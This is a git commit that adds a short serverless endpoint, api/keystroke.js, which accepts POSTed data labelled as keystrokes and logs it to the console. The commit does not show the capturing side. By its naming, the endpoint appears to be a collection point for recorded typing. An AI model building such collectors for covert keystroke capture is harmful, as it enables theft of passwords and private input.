122e36de647fa73993d9a3d8b5a546aecb55ed56
Zoramain0000 <zoragonzales3@gmail.com>
2026-02-19 04:32:07 +0800

    Add keystroke handler for POST requests

---
+++ api/keystroke.js
@@ -0,0 +1,8 @@
+  export default async function handler(req, res) {
+  if (req.method !== 'POST') return res.status(405).end();
+  
+  const keystroke = req.body;
+  console.log('🔑 KEYSTROKE:', keystroke);
+  
+  res.status(200).json({ success: true });
+}
